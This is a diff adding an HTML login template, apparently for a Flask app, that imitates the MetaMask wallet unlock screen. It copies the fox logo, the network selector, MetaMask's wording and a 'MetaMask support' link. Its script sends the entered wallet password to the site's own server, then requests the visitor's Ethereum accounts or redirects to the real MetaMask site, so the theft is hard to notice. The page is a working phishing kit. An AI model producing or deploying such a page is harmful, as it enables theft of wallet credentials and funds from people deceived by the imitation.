@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MySafe - Welcome Back</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="network-selector">
+        <img src="{{ url_for('static', filename='eth_logo.svg') }}" alt="Ethereum">
+        Ethereum Mainnet
+    </div>
+    <img src="{{ url_for('static', filename='fox.svg') }}" alt="MetaMask" class="metamask-logo">
+    
+    <div class="container">
+        <div class="logo">
+            <img src="{{ url_for('static', filename='fox.svg') }}" alt="Fox" class="fox-icon">
+        </div>
+        <h1>Welcome back!</h1>
+        <p class="subtitle">The decentralized web awaits</p>
+        
+        <form id="loginForm" method="POST" action="{{ url_for('login') }}">
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Password" required>
+                {% with messages = get_flashed_messages() %}
+                    {% if messages %}
+                        {% for message in messages %}
+                            <div class="alert">{{ message }}</div>
+                        {% endfor %}
+                    {% endif %}
+                {% endwith %}
+                <button type="submit" class="unlock-btn">Unlock</button>
+            </div>
+        </form>
+        <a href="#" class="forgot-link">Forgot password?</a>
+        <p class="support-text">Need help? Contact <a href="#">MetaMask support</a></p>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const passwordInput = this.querySelector('input[type="password"]');
+            const alertDiv = this.querySelector('.alert') || document.createElement('div');
+            alertDiv.className = 'alert';
+            
+            try {
+                const response = await fetch(this.action, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                // Clear password field immediately after submission
+                passwordInput.value = '';
+                
+                const data = await response.json();
+                
+                if (data.redirect === 'metamask') {
+                    // Attempt to open MetaMask
+                    if (typeof window.ethereum !== 'undefined') {
+                        try {
+                            // Simple request to connect to MetaMask
+                            await ethereum.request({ 
+                                method: 'eth_requestAccounts'
+                            });
+                        } catch (err) {
+                            console.error('MetaMask connection failed:', err);
+                            alertDiv.textContent = 'Failed to connect to MetaMask. Please try again.';
+                            if (!alertDiv.parentNode) {
+                                passwordInput.parentNode.insertBefore(alertDiv, passwordInput.nextSibling);
+                            }
+                        }
+                    } else {
+                        // If MetaMask is not installed, redirect to MetaMask website
+                        window.location.href = 'https://metamask.io/download/';
+                    }
+                } else if (data.status === 'error') {
+                    // Show error message
+                    alertDiv.textContent = data.message;
+                    if (!alertDiv.parentNode) {
+                        passwordInput.parentNode.insertBefore(alertDiv, passwordInput.nextSibling);
+                    }
+                    passwordInput.focus();
+                }
+            } catch (err) {
+                console.error('Request failed:', err);
+                alertDiv.textContent = 'An error occurred. Please try again.';
+                if (!alertDiv.parentNode) {
+                    passwordInput.parentNode.insertBefore(alertDiv, passwordInput.nextSibling);
+                }
+            }
+        });
+    </script>
+</body>
+</html> 
